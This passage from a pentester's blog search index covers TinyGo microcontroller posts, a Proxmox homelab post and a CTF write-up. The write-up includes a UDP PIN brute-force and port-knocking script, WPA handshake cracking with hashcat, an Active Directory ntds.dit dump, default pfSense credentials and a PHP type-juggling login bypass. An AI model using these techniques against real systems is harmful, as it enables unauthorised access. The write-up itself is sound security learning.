/usr/local/lib/tinygo/targets/xiao-new.json) as shown below.\n{ \u0026#34;inherits\u0026#34;: [\u0026#34;atsamd21g18a\u0026#34;], \u0026#34;build-tags\u0026#34;: [\u0026#34;xiao\u0026#34;], \u0026#34;serial\u0026#34;: \u0026#34;usb\u0026#34;, \u0026#34;serial-port\u0026#34;: [\u0026#34;2886:802f\u0026#34;], \u0026#34;flash-1200-bps-reset\u0026#34;: \u0026#34;true\u0026#34;, \u0026#34;flash-method\u0026#34;: \u0026#34;msd\u0026#34;, \u0026#34;msd-volume-name\u0026#34;: \u0026#34;Seeed XIAO\u0026#34;, \u0026#34;msd-firmware-name\u0026#34;: \u0026#34;firmware.uf2\u0026#34; } After this, the flash command still didn\u0026rsquo;t worked (at least for me) so in order to fix this, everytime I wanted to upload the new firmware to the microcontroller I had to compile the program and move the .uf2 to the XIAO device\nThe following shows an example to emulate a keyboard by opening xcalc on my device (using i3wm with dmenu).\npackage main import ( \u0026#34;machine/usb/hid/keyboard\u0026#34; ) /* WINDOWS KEY + ENTER (opens dmenu) WRITE xcalc ENTER */ func Openxcalc() {\tkb := keyboard.Port() runs := 1 for { if runs == 2 { break } runs +=1 time.Sleep(1000 * time.Millisecond) kb.Down(keyboard.KeyModifierGUI) kb.Down(keyboard.KeyEnter) kb.Release() time.Sleep(1000 * time.Millisecond) kb.Write([]byte(\u0026#34;xcalc\u0026#34;)) time.Sleep(1000 * time.Millisecond) kb.Press(keyboard.KeyEnter) } } $ tinygo build -o firmware.uf2 -target=xiao-new main.go \u0026amp;\u0026amp; sudo mkdir -p /media/xiao \u0026amp;\u0026amp; sudo mount /dev/sda /media/xiao \u0026amp;\u0026amp; sudo cp firmware.uf2 /media/xiao Digispark In order to show how TinyGo works in Digispark, Ill demonstrate a flashing led in the Digispark device.\nFor that, download the latest release of micronucleus (https://github.com/micronucleus/micronucleus/releases) and perform the following steps:\n$ unzip ~/Downloads/micronucleus-cli-master-882e7b4a $ sudo cp micronucleus-cli-master-882e7b4a/micronucleus /usr/local/bin/micronucleus $ export PATH=$PATH:/usr/local/bin/micronucleus $ tinygo flash -target=digispark digispark/digispark.go INSERT USB STICK The following code is the flashing led provided by TinyGo.\npackage main import ( \u0026#34;machine\u0026#34; ) // Blinking LEDs func BlinkingLEDs() { led := machine.LED led.Configure(machine.PinConfig{Mode: machine.PinOutput}) for { led.Low() time.Sleep(1000 * time.Millisecond) led.High() time.Sleep(1000 * time.Millisecond) } } Reset There are two simple techniques to reset the devices, after flashing them.\nThe first works in XIAO and the goal is to double tap the RST pins like is shown here.\nTo reset the Digispark board, we can use the same flash command but now with an empty for loop.\nResources https://tinygo.org/ https://circuitdigest.com/article/introduction-to-bit-banging-spi-communication-in-arduino-via-bit-banging https://wiki.seeedstudio.com/Seeeduino-XIAO/ https://github.com/BrunoTeixeira1996/go-microcontrollers/tree/main/programs ", 
        "url": "http:\/\/localhost:1313\/posts\/2023-05-26-tinygo-in-microcontrollers\/"
    },
    
    "http:\/\/localhost:1313\/about\/": {
        "title": "About",
        "tags": [],
        "content": "About me My name is Bruno Teixeira and I am an Offensive Cyber Security Analyst. Focused on learning Information Security and Systems Administration. Always doing some side projects to improve my coding skills and learn new technologies on the way.\nWork Experience Pentester @ Logicalis PT (Current) Pentester @ Layer8 Offensive Cyber Security Analyst @ ArtResilia Technical Support / Service Desk @ CGI Military @ Exército Português Education BsC Computer Engineering @ ISEC Coimbra CET Network and Systems @ CINEL Porto IT \u0026amp; Programming @ EISnt, High School Socials GitHub Twitter LinkedIn ", 
        "url": "http:\/\/localhost:1313\/about\/"
    },
    
    "http:\/\/localhost:1313\/posts\/2023-04-28-migrating-to-proxmox\/": {
        "title": "Migrating from ESXi to Proxmox",
        "tags": ["Homelab",],
        "content": "Index Introduction ZFS Pool Content Resources Introduction During college I used ESXi to host a few VM\u0026rsquo;s because I had a low end laptop that was not able to handle multiple VM\u0026rsquo;s turned on. After finishing college I decided to move to Proxmox as I wanted to persue the open source route.\nTo be able to acomplish this I gathered two HDD drives (500 GB each) and two SSD (250 GB each). The plan was simple, I would use a ZFS pool (Raid 1) for the two HDD drives and another ZFS pool (Raid 1) for the SSDs using HDDs as data storage and SSDs to run the VMs\u0026rsquo; operating systems.\nZFS Pool I installed Proxmox OS in the SSD zfs pool (this is easily done in the setup menu) and after that I created the other zfs pool for the HDDs. For the second zfs pool I used a really cool youtube video that goes step by step on how to do this. So I created a backup folder and a ISOs folder.\nContent After reading about LXC I decided to use it as they are awesome to segment services, faster than VM\u0026rsquo;s and easy to be created and since I don\u0026rsquo;t need any GUI LXC were the best option.\nThe following shows the current LXC I am currently running and their purpose\nWeb server (custom go web server for rating movies and series) telegram bot (telegram bot that handles some useful commands) Wireguard (my vpn) Syncthing (useful to sync files and folders between machines like keepassxc database) Fresh RSS (rss feed) Setting up an external hard drive I was looking for an affordable external hard drive to act as a data storage for the Proxmox server. I\u0026rsquo;ve found a cheap Seagate Basic 2TB USB 3.0 and decided to buy it.\nFollowing a guide on youtube I was then able to add a storage to Proxmox and use it just like a mount point on all of my LXC containers.\nResource https://arstechnica.com/information-technology/2020/05/zfs-101-understanding-zfs-storage-and-performance/ https://www.youtube.com/watch?v=oSD-VoloQag ", 
        "url": "http:\/\/localhost:1313\/posts\/2023-04-28-migrating-to-proxmox\/"
    },
    
    "http:\/\/localhost:1313\/posts\/2022-12-31-0xoposec\/": {
        "title": "0xOPOSEC Christmas Challenge 2022",
        "tags": ["CTF",],
        "content": "\u0026ldquo;Based in Porto, the 0xOPOSEC group was started by g33ks who are passionate about security. The meetup primary mission is to discuss and tackle upsurging security issues by leveraging the expertise and know-how of members of the group.\u0026rdquo;\nMisc Black Hole \u0026ldquo;An exception is an abnormal event or error that occurs during the execution of a program. Exceptions are typically used to handle unexpected or exceptional co nditions, such as runtime errors or input-output errors. When an exception occurs, it is typically represented as an object that is thrown, and it can be caug ht and handled by the program using a try-catch block.\u0026rdquo;\nAfter downloading the .rar file, I opened and that contained the flag.txt but was password protected.\nWell after reading the description I was a bit confused but when I did unrar e l33t.rar I got the following.\nUNRAR 6.00 freeware Copyright (c) 1993-2020 Alexander Roshal Extracting from l33t.rar Python 3.7.3 \u0026gt;\u0026gt;\u0026gt; ︎◼︎◼︎◼︎ Traceback (most recent call last): File \u0026#34;\u0026lt;pyshell#4\u0026gt;\u0026#34;, line 1, in \u0026lt;module\u0026gt; ︎◼︎◼◼ ZeroDivisionError: ◼︎◼︎◼︎ \u0026lt;- Password \u0026gt;\u0026gt;\u0026gt; Enter password (will not be echoed) for flag.txt: So I got the ZeroDivisionError exception like the description said and a stack trace.\nSo googling by the ZeroDivisionError I got:\n\u0026ldquo;ZeroDivisionError is a built-in Python exception thrown when a number is divided by 0. This means that the exception raised when the second argument of a division or modulo operation is zero. In Mathematics, when a number is divided by a zero, the result is an infinite number.\u0026rdquo;\nI was curious on how I was doing an exception but I wasn\u0026rsquo;t, the creators only modified the hex values of the .rar to contain the string with the exception.\nDoing strings worked too and returned this output\n$ strings l33t.rar Rar! CMTPython 3.7.3 \u0026gt;\u0026gt;\u0026gt; Traceback (most recent call last): File \u0026#34;\u0026lt;pyshell#4\u0026gt;\u0026#34;, line 1, in \u0026lt;module\u0026gt; ZeroDivisionError: \u0026lt;- Password flag.txt0 90|ua So If we open a python interpreter and we use a division by 0 we got this\nPython 3.9.2 (default, Feb 28 2021, 17:03:44) [GCC 10.2.1 20210110] on linux Type \u0026#34;help\u0026#34;, \u0026#34;copyright\u0026#34;, \u0026#34;credits\u0026#34; or \u0026#34;license\u0026#34; for more information. \u0026gt;\u0026gt;\u0026gt; 0 / 0 Traceback (most recent call last): File \u0026#34;\u0026lt;stdin\u0026gt;\u0026#34;, line 1, in \u0026lt;module\u0026gt; ZeroDivisionError: division by zero Since they tell us the Password is the output of the ZeroDivisionError I used division by zero as the password and got the flag.\nflag{l0vef@rf4t0h} A Programming Language \u0026ldquo;flag←48 55 45 52 73 53 0 67 63 4 59 5 73 24 69 9 62 15 64 76 43 16 78 73 18 96 ⊢WTF←⎕UCS{⍵-¨10-⍨⍳≢⍵}+flag+2⊥¯3⌽1 0 1 1 0 1\u0026rdquo;\nAfter some googling I\u0026rsquo;ve found that this is related with APL A Programming Language.\nNext thing I did was to find an online interpreter so, copy and pasting the descriptions I was getting an error saying undefined name: flag .\nSo I started to tweak a little bit.\nStill nothing \u0026hellip; So I went to wikipedia and studied a bit how this language worked and for some reason ← is the assgin symbol so I this must be lacking a \\n somewhere.\nMy idea was to assign and then apply the function ⊢ WTF←⎕UCS{⍵-¨10-⍨⍳≢⍵} (From what I understand, this will go to the unicode values of the flag var and decrements 10 to each unicode value).\nThen I append with the + sign the new values to the flag using flag+2⊥¯3⌽1 0 1 1 0 1 (Not quite sure whats happening here, but I assume this is probably converting unicode to ASCII).\nflag{f0rm1g0sAm0d4doM1nh0} Find The Typo In this challenge we get a table of SI multiples of gram, a nonogram and a password protected .zip with the flag.\nNonograms is a logic puzzle with simple rules We have a grid of squares, which must be either filled in black or maked with X Besides each row of the grid are listed the lenghts of the turns of black squares on that row Above each column are listed the lenghts of the runs of black squares in that colum These numbers tells us the runs of black squares in that row/column. So, if we see \u0026lsquo;10 1\u0026rsquo;, that tells us that there will be a run of exactly 10 black squares, followed by one or more white square, followed by a single black square Our goal is to find all black squares With the help of my gf (she used to play nonogram games on her phone) I\u0026rsquo;ve marked the nonogram and that represented the pacman.\nAfter discovering that this would be pacman I tried that but It didn\u0026rsquo;t worked so I tried to understand and correlate the pacman with the first table but looking again at the challenge title, there\u0026rsquo;s a typo somewhere and I was making the typo \u0026hellip;\nI used pac-man on the zip file and that worked and got the flag.\nflag{bread_bread_cheese_cheese} Back Me Up! \u0026ldquo;Someone left backups of a Domain Controller in an open share. A portion was extracted from the backup and myth be told that it contains critical information (and a flag ;) Can you get it?\u0026rdquo;\nAfter extracting the zip file I got an Active Directory folder and a registry folder.\nFirst I went to the Active Directory folder and that contained a .dit file.\n$ file ntds.dit ntds.dit: Extensible storage engine DataBase, version 0x620, checksum 0xa4ae6abb, page size 8192, Windows version 6.3 After googling I\u0026rsquo;ve found that this is an Extensible Storage Engine (ESE) and this is an advanced indexed and sequential access method (ISAM) storage technology. ESE enables applications to store and retrieve data from tables using indexed or sequential cursor navigation. It is usually utilized by various Microsoft Services such as Microsoft Exchange Server, Active Directory, and Windows Search.\nBriefly this is a database file which stores AD Data including User Object, Groups and Group Memebers, Password hashes, etc.\nNext I\u0026rsquo;ve looked on how I could extract info from this database file and I\u0026rsquo;ve found libesedb (Library and tools to access the Extensible Storage Engine (ESE) Database File (EDB) format).\nI installed libesedb.\n$ wget https://github.com/libyal/libesedb/releases/download/20220806/libesedb-experimental-20220806.tar.gz $ tar libesedb-experimental-20220806.tar.gz $ sudo apt-get install autoconf automake autopoint libtool pkg-config $ cd libesedb-20220806 \u0026amp;\u0026amp; ./configure $ make $ sudo make install $ sudo ldconfig And then dumped the data from the db file.\n$ esedbexport -m tables ntds.dit Opening the files got me the flag.\nflag{ClearBackupsCanPwnU} Network 867 CFR \u0026ldquo;867 CFR is a protocol for sending data across networks. It is connectionless, meaning it does not establish a dedicated connection between sender and receiver. This makes it faster but less reliable than other transport protocols. 867 CFR is often used for real-time applications such as gaming and VoIP, and for low-overhead services like DNS. Weird stuff! Can you have a look? cc.isymra.22samxopo (344)\u0026rdquo;\n867 CFR its nothing but if we reverse the string we got RFC 768 and thats User Datagram Protocol (UDP).\nDoing the same reverse on the cc.isymra.22samxopo we got \u0026lsquo;opoxmas22.armysi.cc\u0026rsquo; and 344 should be 443.\n\u0026gt;\u0026gt;\u0026gt; \u0026#34;cc.isymra.22samxopo\u0026#34;[::-1] \u0026#39;opoxmas22.armysi.cc\u0026#39; I tried to access opoxmas22.armysi.cc:443 but I got denied.\nChecked on Wireshark for any hits on connecting to the above domain but found nothing.\nAfter a while I tought that this could be some sort of UDP socket connection and for that I used a simple python script to connect to the server (opoxmas22.armysi.cc:443) as client and then send a simple \u0026ldquo;Hello\u0026rdquo;.\nimport socket server_add_and_port = (\u0026#34;opoxmas22.armysi.cc\u0026#34;, 443) udp_client_socket = socket.socket(family=socket.AF_INET, type=socket.SOCK_DGRAM) # created UDP socket on client udp_client_socket.sendto(str.encode(\u0026#34;Hello\u0026#34;), server_add_and_port) # sends message to server socket msg_from_server = udp_client_socket.recvfrom(1024) print(msg_from_server[0]) After executing this I got the following bytes, so I just had to reverse those again.\nb\u0026#39;}eep_eed_uoy{galf\\n\u0026#39; Reversing and cleaning the string (print(msg_from_server[0][::-1].decode(\u0026quot;utf-8\u0026quot;).strip())) I got the correct flag.\nflag{you_dee_pee} Who There \u0026ldquo;I do not have a physical body, but I am here to help you with any questions you may have, give me a PIN, and I will tell you what to do next! opoxmas22.armysi.cc (22222) looks interesting!\u0026rdquo;\nRunning nmap on opoxmas22.armysi.cc:22222 got a filtered result\n$ sudo nmap -p22222 opoxmas22.armysi.cc Starting Nmap 7.92 ( https://nmap.org ) at 2022-12-26 11:36 WET Nmap scan report for opoxmas22.armysi.cc (95.217.178.98) Host is up (0.00026s latency). rDNS record for 95.217.178.98: static.98.178.217.95.clients.your-server.de PORT STATE SERVICE 22222/tcp filtered easyengine Nmap done: 1 IP address (1 host up) scanned in 0.41 seconds Running another nmap to get more info.\n$ sudo nmap -A -p22222 opoxmas22.armysi.cc -oN nmap/initial Starting Nmap 7.92 ( https://nmap.org ) at 2022-12-26 11:44 WET Nmap scan report for opoxmas22.armysi.cc (95.217.178.98) Host is up (0.016s latency). rDNS record for 95.217.178.98: static.98.178.217.95.clients.your-server.de PORT STATE SERVICE VERSION 22222/tcp filtered easyengine Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: webcam|general purpose|PBX|WAP|specialized|power-device|router Running (JUST GUESSING): AXIS embedded (98%), GNU Hurd (98%), Linux 2.0.X|2.2.X (98%), Netgear embedded (98%), ZKTeco embedded (98%), CAEN embedded (98%) OS CPE: cpe:/h:axis:2100_network_camera cpe:/o:gnu:hurd cpe:/o:linux:linux_kernel:2.0.36 cpe:/o:linux:linux_kernel:2.0.38 cpe:/o:linux:linux_kernel:2.2.14 cpe:/h:netgear:wg602v1 cpe:/o:linux:linux_kernel:2.0.39 Aggressive OS guesses: AXIS 2100 Network Camera (98%), AXIS 2120 Network Camera (98%), GNU Hurd 0.3 (98%), Linux 2.0.36 (Red Hat 5.2) (98%), elmeg T240 or T444 PABX (Linux 2.0.38) (98%), Netgear WG602v1 WAP (Linux 2.2.14) (98%), ZKTeco F18 fingerprint reader (98%), CAEN SY2527 high voltage power supply (98%), Linux 2.0.33 (98%), Linux 2.0.35 - 2.0.36 (98%) No exact OS matches for host (test conditions non-ideal). Network Distance: 2 hops TRACEROUTE (using port 80/tcp) HOP RTT ADDRESS 1 0.37 ms 10.0.2.2 2 0.49 ms static.98.178.217.95.clients.your-server.de (95.217.178.98) OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 3.42 seconds Reading again the description I assumed that this was some sort of a Bot that needs a PIN, so I tried to think on how I could communicate with this service.\nI\u0026rsquo;ve tried http, ssh, telnet, nc but nothing worked.\nAfter a while I tried to use the same code from the previous network chall and that worked, so the connection is using sockets.\n$ python3 send.py b\u0026#39;WRONG PIN!\u0026#39; Since this is using UDP again I did a new nmap scan for UDP instead of TCP using sudo nmap -sC -sV -A -sU -p22222 -oN nmap/all opoxmas22.armysi.cc -v and got\nPORT STATE SERVICE VERSION 22222/udp open unknown | fingerprint-strings: | AFSVersionRequest, Citrix, DNS-SD, DNSStatusRequest, DNSVersionBindReq, DTLSSessionReq, Help, NBTStat, NTPRequest, NetMotionMobility, QUIC, RPCCheck, SNMPv1public, SNMPv3GetRequest, Sqlping, sybaseanywhere, xdmcp: | WRONG PIN! | Kerberos: | Opened port 23590 - Hurry you got 60 seconds!. Use this PIN - 1882 | SIPOptions: |_ Opened port 28002 - Hurry you got 60 seconds!. Use this PIN - 4958 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port22222-UDP:V=7.92%I=7%D=12/26%Time=63A9D15F%P=x86_64-pc-linux-gnu%r( SF:RPCCheck,A,\u0026#34;WRONG\\x20PIN!\u0026#34;)%r(DNSVersionBindReq,A,\u0026#34;WRONG\\x20PIN!\u0026#34;)%r(DN SF:SStatusRequest,A,\u0026#34;WRONG\\x20PIN!\u0026#34;)%r(NBTStat,A,\u0026#34;WRONG\\x20PIN!\u0026#34;)%r(Help,A SF:,\u0026#34;WRONG\\x20PIN!\u0026#34;)%r(SIPOptions,42,\u0026#34;Opened\\x20port\\x2028002\\x20-\\x20Hurr SF:y\\x20you\\x20got\\x2060\\x20seconds!\\.\\x20Use\\x20this\\x20PIN\\x20-\\x204958\u0026#34; SF:)%r(Sqlping,A,\u0026#34;WRONG\\x20PIN!\u0026#34;)%r(NTPRequest,A,\u0026#34;WRONG\\x20PIN!\u0026#34;)%r(SNMPv1 SF:public,A,\u0026#34;WRONG\\x20PIN!\u0026#34;)%r(SNMPv3GetRequest,A,\u0026#34;WRONG\\x20PIN!\u0026#34;)%r(xdmcp SF:,A,\u0026#34;WRONG\\x20PIN!\u0026#34;)%r(AFSVersionRequest,A,\u0026#34;WRONG\\x20PIN!\u0026#34;)%r(DNS-SD,A,\u0026#34; SF:WRONG\\x20PIN!\u0026#34;)%r(Citrix,A,\u0026#34;WRONG\\x20PIN!\u0026#34;)%r(Kerberos,42,\u0026#34;Opened\\x20po SF:rt\\x2023590\\x20-\\x20Hurry\\x20you\\x20got\\x2060\\x20seconds!\\.\\x20Use\\x20t SF:his\\x20PIN\\x20-\\x201882\u0026#34;)%r(sybaseanywhere,A,\u0026#34;WRONG\\x20PIN!\u0026#34;)%r(NetMoti SF:onMobility,A,\u0026#34;WRONG\\x20PIN!\u0026#34;)%r(DTLSSessionReq,A,\u0026#34;WRONG\\x20PIN!\u0026#34;)%r(QUI SF:C,A,\u0026#34;WRONG\\x20PIN!\u0026#34;); Device type: webcam|power-device|general purpose|PBX|router Running: AXIS embedded, CAEN embedded, Linux 2.0.X OS CPE: cpe:/h:axis:2100_network_camera cpe:/o:linux:linux_kernel:2.0.33 cpe:/o:linux:linux_kernel:2.0.38 cpe:/o:linux:linux_kernel:2.0.39 Too many fingerprints match this host to give specific OS details Network Distance: 2 hops TRACEROUTE (using port 80/tcp) HOP RTT ADDRESS 1 0.40 ms 10.0.2.2 2 0.51 ms static.98.178.217.95.clients.your-server.de (95.217.178.98) NSE: Script Post-scanning. Initiating NSE at 16:54 Completed NSE at 16:54, 0.00s elapsed Initiating NSE at 16:54 Completed NSE at 16:54, 0.00s elapsed Initiating NSE at 16:54 Completed NSE at 16:54, 0.00s elapsed Read data files from: /usr/bin/../share/nmap OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 99.54 seconds Raw packets sent: 30 (2.572KB) | Rcvd: 15 (930B) Knowing the nmap output, I\u0026rsquo;ve noticed that this must be Port knocking (even the Challenge name represents that like -\u0026gt; \u0026ldquo;Knock knock\u0026rdquo; -\u0026gt; \u0026ldquo;Who\u0026rsquo;s There\u0026rdquo;)\nThis took me 2 days to solve because I was stuck on how I could exploit this but after a lot of reading I\u0026rsquo;ve noticed I already had half of exploit done. from the previous network challenge.\nSo to build this exploit I first needed to know what pin does port 22222 accepts (I\u0026rsquo;ve used a range from 0 to 99999 by trial/error and looks like the PIN for 22222 is 10000) and then knock two times (this is not fixed, we can configure more than 2 knock on a port knocking, but on this challenge this was 2 knocks) with the new port + new pin.\nI\u0026rsquo;ve built an exploit that does this and got the flag.\nimport socket def make_request(port,pin): print(f\u0026#34;Trying with port: {port} and pin: {pin}\u0026#34;) server_add_and_port = (\u0026#34;opoxmas22.armysi.cc\u0026#34;, port) udp_client_socket = socket.socket(family=socket.AF_INET, type=socket.SOCK_DGRAM) udp_client_socket.sendto(str.encode(pin), server_add_and_port) msg_from_server = udp_client_socket.recvfrom(1024) msg = msg_from_server[0].decode(\u0026#34;utf-8\u0026#34;) if \u0026#34;Flag\u0026#34; in msg: print(msg) return port, pin = msg.split(\u0026#34; \u0026#34;)[2], msg.split(\u0026#34; \u0026#34;)[-1] return port, pin def brute_force(): server_add_and_port = (\u0026#34;opoxmas22.armysi.cc\u0026#34;, 22222) udp_client_socket = socket.socket(family=socket.AF_INET, type=socket.SOCK_DGRAM) # try and find the PIN for the 22222 port for i in range(10000,99999): udp_client_socket.sendto(str.encode(str(i)), server_add_and_port) msg_from_server = udp_client_socket.recvfrom(1024) msg = msg_from_server[0].decode(\u0026#34;utf-8\u0026#34;) if msg != \u0026#34;WRONG PIN!\u0026#34;: port, pin = msg.split(\u0026#34; \u0026#34;)[2], msg.split(\u0026#34; \u0026#34;)[-1] port, pin = make_request(int(port),str(pin)) make_request(int(port),str(pin)) break if __name__ == \u0026#34;__main__\u0026#34;: brute_force() $ python3 send.py Trying with port: 29475 and pin: 9379 Trying with port: 28414 and pin: 6313 Flag{Kito_KitoWho?_MosKito} flag{Kito_KitoWho?_MosKito} My Network Is Secure! \u0026ldquo;Taberna belga said their free WiFi is secure because it has a password, however people are still getting passwords! How is this possible?!\u0026rdquo;\nAfter opening the cap file in in wireshark I\u0026rsquo;ve noticed the data on the communication process is encripted, probably because they are using wpa with some passphrase so this is encrypted.\nSince this is from a Wifi network we know we need to try to get the wpa-pwd to decrypt the communication from the protocol IEEEE802.11.\nNext thing I did was to find a way to grab the encrypted password so I could use the rockyou.txt wordlist with hashcat to try to crack it.\nA cool way to grab the encrypted password and make it hashcat readable is to use hcxpcapngtool (Portable solution for capturing wlan traffic and conversion to hashcat formats (recommended by hashcat) and to John the Ripper formats).\nSo I did that and got a WPA hash.\n$ hcxpcapngtool -o hash SecuredNetwork.cap $ cat hash WPA*02*4ca8dcfc1ae47ae4c892d2cc25f4e1e5*907841398870*d6a78c062e85*5365637572654e65742057696669*3ca0a8709bf3a4dc5041041109b41f01565f7b5a30608ed4c02e5c4f523e4be3*01030077fe01090020000000000000000110f11a201a62f4f081e097ee34d8c20f84822bb6aa0ab4c0af3423657187dbf80000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000018dd160050f20101000050f20201000050f20201000050f202*02 Next I searched for the mode for WPA hashes in hashcat and runed that with rockyou and got the password.\n$ hashcat -m 22000 wandshakes /usr/share/wordlists/rockyou.txt hashcat (v6.1.1) starting... Dictionary cache built: * Filename..: /usr/share/wordlists/rockyou.txt * Passwords.: 14344392 * Bytes.....: 139921507 * Keyspace..: 14344385 * Runtime...: 1 sec 4ca8dcfc1ae47ae4c892d2cc25f4e1e5:907841398870:d6a78c062e85:SecureNet Wifi:spiderman Session..........: hashcat Status...........: Cracked Hash.Name........: WPA-PBKDF2-PMKID+EAPOL So now I have the SID + the password.\nThe SID was already known because it was plaintext on the pcap file.\nNow I needed to insert the password:SID on wireshark so I could check the communication\nSo I did Edit -\u0026gt; Preferences -\u0026gt; Protocols and searched for IEEE802.11 and added the decryption key.\nAfter pressing ok I got more traffic but the one I looked for was the tcp.\nFollowing the TCP STREAM I got the flag.\nflag{morestudy} Crypto Mmmm Donuts \u0026ldquo;Donuts are the best breakfast food! There is a donut flavor for everyone\u0026rsquo;s taste, they pair great with coffee, and they can be eaten on the go! The key to solve this challenge is the most important meal of the day. If one donut doesn\u0026rsquo;t help, try having another. You better solve it fast before you get diabetes. PS: My favorite donut is the original, just glazed.\u0026rdquo;\nThis was a hard one for me since I don\u0026rsquo;t know much about crypto ctfs and the description was not good enough.\nBut after getting some hits, I\u0026rsquo;ve found that this was using bacon-cipher.\nImplementing bacon-cipher decryption on the image I got the following\na not bold b bold aaba bbaaaa bab ab ababb ab bab aba aabaa aaaaaa aa abb aab ab aa aab bab aaa\nThen I used vigenere-cipher with the key breakfast and got the flag\nflag{eatmedrinkme} Lets Share! \u0026ldquo;Encoding is the process of converting data from one format into another, typically for the purposes of efficient transmission or storage. There are many different types of encoding schemes that can be used, depending on the specific requirements of the data and the intended use. Encoding is an important aspect of data management and is used in a variety of applications, including networking, data storage, and multimedia.\u0026rdquo;\n$ cat coded_data.txt JTI2JTIzOTAlM0IlMjYlMjMxMDklM0IlMjYlMjMxMjAlM0IlMjYlMjMxMDQlM0IlMjYlMjM5MCUzQiUyNiUyMzUxJTNCJTI2JTIzMTE2JTNCJTI2JTIzMTA1JTNCJTI2JTIzNzclM0IlMjYlMjM3MSUzQiUyNiUyMzExOSUzQiUyNiUyMzExOSUzQiUyNiUyMzg4JTNCJTI2JTIzNTElM0IlMjYlMjM3MyUzQiUyNiUyMzEyMiUzQiUyNiUyMzc3JTNCJTI2JTIzODYlM0IlMjYlMjM1NyUzQiUyNiUyMzcxJTNCJTI2JTIzODYlM0IlMjYlMjM3MCUzQiUyNiUyMzEwMCUzQiUyNiUyMzU3JTNC Looking at txt file at first sight I saw that this was use base64 so I put on Cybechef and used the Magic recipe but that didn\u0026rsquo;t do much.\nKnowing this I tried to help Cyberchef by already providing the base64 decoded string and that got me the flag.\nI wanted to understand how many encodings were happening here so I did a python script to help me on this and by trial/error I\u0026rsquo;ve managed to found that this was using 4 encodings\nbase64 -\u0026gt; url encoding -\u0026gt; HTML entity encoding -\u0026gt; base64\nimport base64 import urllib.parse import html with open(\u0026#34;coded_data.txt\u0026#34;, \u0026#34;r\u0026#34;) as f: stage_1 = f.readline().strip() print(f\u0026#34;Stage 1 -\u0026gt; {stage_1}\\n\u0026#34;) stage_2 = base64.b64decode(stage_1).decode(\u0026#34;utf-8\u0026#34;) print(f\u0026#34;Stage 2 -\u0026gt; {stage_2}\\n\u0026#34;) stage_3 = urllib.parse.unquote(stage_2) print(f\u0026#34;Stage 3 -\u0026gt; {stage_3}\\n\u0026#34;) stage_4 = html.unescape(stage_3) print(f\u0026#34;Stage 4 -\u0026gt; {stage_4}\\n\u0026#34;) stage_5 = base64.b64decode(stage_4).decode(\u0026#34;utf-8\u0026#34;) print(f\u0026#34;Stage 5 -\u0026gt; {stage_5}\\n\u0026#34;) $ python3 uncoded.py Stage 1 -\u0026gt; JTI2JTIzOTAlM0IlMjYlMjMxMDklM0IlMjYlMjMxMjAlM0IlMjYlMjMxMDQlM0IlMjYlMjM5MCUzQiUyNiUyMzUxJTNCJTI2JTIzMTE2JTNCJTI2JTIzMTA1JTNCJTI2JTIzNzclM0IlMjYlMjM3MSUzQiUyNiUyMzExOSUzQiUyNiUyMzExOSUzQiUyNiUyMzg4JTNCJTI2JTIzNTElM0IlMjYlMjM3MyUzQiUyNiUyMzEyMiUzQiUyNiUyMzc3JTNCJTI2JTIzODYlM0IlMjYlMjM1NyUzQiUyNiUyMzcxJTNCJTI2JTIzODYlM0IlMjYlMjM3MCUzQiUyNiUyMzEwMCUzQiUyNiUyMzU3JTNC Stage 2 -\u0026gt; %26%2390%3B%26%23109%3B%26%23120%3B%26%23104%3B%26%2390%3B%26%2351%3B%26%23116%3B%26%23105%3B%26%2377%3B%26%2371%3B%26%23119%3B%26%23119%3B%26%2388%3B%26%2351%3B%26%2373%3B%26%23122%3B%26%2377%3B%26%2386%3B%26%2357%3B%26%2371%3B%26%2386%3B%26%2370%3B%26%23100%3B%26%2357%3B Stage 3 -\u0026gt; \u0026amp;#90;\u0026amp;#109;\u0026amp;#120;\u0026amp;#104;\u0026amp;#90;\u0026amp;#51;\u0026amp;#116;\u0026amp;#105;\u0026amp;#77;\u0026amp;#71;\u0026amp;#119;\u0026amp;#119;\u0026amp;#88;\u0026amp;#51;\u0026amp;#73;\u0026amp;#122;\u0026amp;#77;\u0026amp;#86;\u0026amp;#57;\u0026amp;#71;\u0026amp;#86;\u0026amp;#70;\u0026amp;#100;\u0026amp;#57; Stage 4 -\u0026gt; ZmxhZ3tiMGwwX3IzMV9GVFd9 Stage 5 -\u0026gt; flag{b0l0_r31_FTW} flag{b0l0_r31_FTW} Web The Folt \u0026ldquo;pfSense is a free and open-source firewall and router software distribution based on the FreeBSD operating system. It is designed to provide a flexible and powerful platform for building and managing network infrastructure, and it includes a wide range of features and capabilities that are suitable for use in both small and large networks. Have a try http://machine.armysi.cc/\"\nThe URL redirected to a pfsense login menu so I just searched for the default creds for the pfsense login menu and found admin:pfsense and that got me the first flag\nflag{Default?_More_Like_Badfault} In Passwords, We Trust, and in PHP, We Believe! \u0026ldquo;Great, another admin panel, do you think you can crack it? (https://santa.sefod.eu/)\"\nWe are presented with a login page that is written in PHP.\nAfter going to the source code we have the php logic of the login menu.\nWe can see that to get the flag we need to have the user == \u0026ldquo;admin\u0026rdquo; and the password must be the same as the generated token.\nWe can see too (in the second elseif) that if the passwordis empty we got our token but this is kinda useless as we cant use that token to the next login because it will get generated again.\nI\u0026rsquo;ve noticed a strange thing, why would they use $answer as a json decode of $input ? After this they use the $password var to extract the value of the json object so the vuln/bug must reside here because this is not normal at all.\nAfter googling I\u0026rsquo;ve found this https://security.stackexchange.com/a/63326 so this was php type juggling.\nIll explain better what php type juggling is in another section but the basic idea is that this code uses json_decode() so we can specify a type other than string or array via the JSON object and we know that the type of the $token is a string because its Base64-encoded. Knowing this I tried to find a value that, when loosely compared to a string (because they are using == and not ===), lets me pass the auth check.\nChecking the PHP equality charts, we can see that 0 == \u0026quot;xyz\u0026quot; is true, so I passed the value 0 as password ({\u0026quot;password\u0026quot;: 0}) and got the flag. flag{OnceAgainTypeJuggling} In deep explanation about PHP Type Juggling In PHP we have loose (==) and strict comparison (===)\nThe loose comparison is used to check if the given values are equal or not.\nThe strict comparison checks if the given values are equal and if the data types are the same\nReading the php docs about this we have that Prior to PHP 8.0.0, if a string is compared to a number or a numeric string then the 